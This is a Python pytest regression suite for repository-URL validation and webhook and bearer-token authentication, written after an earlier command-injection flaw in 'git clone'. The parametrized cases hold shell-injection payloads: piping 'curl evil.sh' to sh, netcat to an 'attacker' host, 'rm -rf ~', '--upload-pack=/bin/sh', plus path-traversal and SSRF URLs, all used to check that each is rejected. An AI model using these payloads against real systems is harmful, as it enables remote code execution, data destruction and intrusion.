"""Repository URL validation and request authentication.

These are regression tests for the platform's most serious historical defect:
``repo_url`` flowing from an unauthenticated, wildcard-CORS POST body into
``git clone {repo_url}`` under ``shell=True``.
"""

from __future__ import annotations

import hmac
from hashlib import sha256

import pytest

from bellwether.errors import AuthenticationError, ValidationError
from bellwether.security import (
    validate_repo_url,
    verify_bearer_token,
    verify_webhook_signature,
)

HOSTS = ("github.com", "gitlab.com")


def check(url: str, **kwargs):
    return validate_repo_url(url, allowed_hosts=HOSTS, **kwargs)


class TestAccepted:
    def test_https_github(self) -> None:
        ref = check("https://github.com/owner/repo.git")
        assert ref.host == "github.com"
        assert ref.slug == "owner/repo"
        assert ref.name == "repo"

    def test_without_git_suffix(self) -> None:
        assert check("https://github.com/owner/repo").slug == "owner/repo"

    def test_subdomain_of_allowlisted_host(self) -> None:
        assert check("https://gist.github.com/owner/repo").host == "gist.github.com"

    def test_scp_syntax(self) -> None:
        ref = check("git@github.com:owner/repo.git")
        assert ref.host == "github.com"

    def test_surrounding_whitespace_is_trimmed(self) -> None:
        assert check("  https://github.com/owner/repo  ").slug == "owner/repo"


class TestCommandInjection:
    """Each of these was a working RCE against the previous implementation."""

    @pytest.mark.parametrize(
        "payload",
        [
            "https://github.com/o/r.git; touch /tmp/pwned",
            "https://github.com/o/r.git && curl evil.sh | sh",
            "https://github.com/o/r.git | nc attacker 4444",
            "https://github.com/o/r.git`whoami`",
            "https://github.com/o/r.git$(id)",
            "https://github.com/o/r.git\nrm -rf ~",
            "$(curl evil.sh)",
        ],
    )
    def test_shell_metacharacters_are_rejected(self, payload: str) -> None:
        with pytest.raises(ValidationError):
            check(payload)

    def test_leading_dash_is_rejected(self) -> None:
        # ``git clone --upload-pack=... x`` executes the given command.
        with pytest.raises(ValidationError, match="must not begin with"):
            check("--upload-pack=/bin/sh")

    def test_path_traversal_is_rejected(self) -> None:
        with pytest.raises(ValidationError, match=r"\.\."):
            check("https://github.com/../../etc/passwd")


class TestRejected:
    def test_empty(self) -> None:
        with pytest.raises(ValidationError, match="must not be empty"):
            check("   ")

    def test_unlisted_host(self) -> None:
        with pytest.raises(ValidationError, match="not allowlisted"):
            check("https://evil.example.com/o/r.git")

    def test_lookalike_suffix_is_not_a_subdomain(self) -> None:
        with pytest.raises(ValidationError, match="not allowlisted"):
            check("https://evil-github.com/o/r.git")

    def test_file_scheme(self) -> None:
        with pytest.raises(ValidationError, match="scheme"):
            check("file:///etc/passwd")

    def test_embedded_credentials(self) -> None:
        with pytest.raises(ValidationError, match="credentials"):
            check("https://user:token@github.com/o/r.git")

    def test_overlong_url(self) -> None:
        with pytest.raises(ValidationError, match="exceeds"):
            check("https://github.com/o/" + "a" * 600)

    def test_no_hosts_allowlisted(self) -> None:
        with pytest.raises(ValidationError, match="allowlisted"):
            validate_repo_url("https://github.com/o/r", allowed_hosts=())

    def test_ssrf_to_loopback(self) -> None:
        with pytest.raises(ValidationError):
            validate_repo_url("https://127.0.0.1/o/r", allowed_hosts=("127.0.0.1",))

    def test_ssrf_to_private_range(self) -> None:
        with pytest.raises(ValidationError, match="non-routable"):
            validate_repo_url("https://169.254.169.254/latest", allowed_hosts=("169.254.169.254",))


class TestLocalRepos:
    def test_allowed_when_enabled(self, tmp_path) -> None:
        ref = check(str(tmp_path), allow_local=True)
        assert ref.host == "localhost"

    def test_rejected_by_default(self, tmp_path) -> None:
        with pytest.raises(ValidationError):
            check(str(tmp_path))


class TestWebhookSignature:
    SECRET = "s3cret"
    BODY = b'{"ref":"refs/heads/main"}'

    def signature(self, secret: str = SECRET, body: bytes = BODY) -> str:
        return "sha256=" + hmac.new(secret.encode(), body, sha256).hexdigest()

    def test_valid_signature_passes(self) -> None:
        verify_webhook_signature(self.SECRET, self.BODY, self.signature())

    def test_unset_secret_fails_closed(self) -> None:
        # The old endpoint had no signature check at all: anyone who could reach
        # the port could trigger a clone-and-execute.
        with pytest.raises(AuthenticationError, match="not configured"):
            verify_webhook_signature(None, self.BODY, self.signature())

    def test_missing_header(self) -> None:
        with pytest.raises(AuthenticationError, match="missing"):
            verify_webhook_signature(self.SECRET, self.BODY, None)

    def test_wrong_secret(self) -> None:
        with pytest.raises(AuthenticationError, match="does not match"):
            verify_webhook_signature(self.SECRET, self.BODY, self.signature(secret="wrong"))

    def test_tampered_body(self) -> None:
        with pytest.raises(AuthenticationError, match="does not match"):
            verify_webhook_signature(self.SECRET, b'{"ref":"evil"}', self.signature())

    def test_wrong_algorithm(self) -> None:
        with pytest.raises(AuthenticationError, match="sha256"):
            verify_webhook_signature(self.SECRET, self.BODY, "sha1=abc")


class TestBearerToken:
    def test_no_token_configured_is_a_noop(self) -> None:
        verify_bearer_token(None, None)

    def test_valid(self) -> None:
        verify_bearer_token("tok", "Bearer tok")

    def test_missing_header(self) -> None:
        with pytest.raises(AuthenticationError, match="missing"):
            verify_bearer_token("tok", None)

    def test_wrong_scheme(self) -> None:
        with pytest.raises(AuthenticationError, match="Bearer"):
            verify_bearer_token("tok", "Basic tok")

    def test_wrong_token(self) -> None:
        with pytest.raises(AuthenticationError, match="invalid"):
            verify_bearer_token("tok", "Bearer nope")
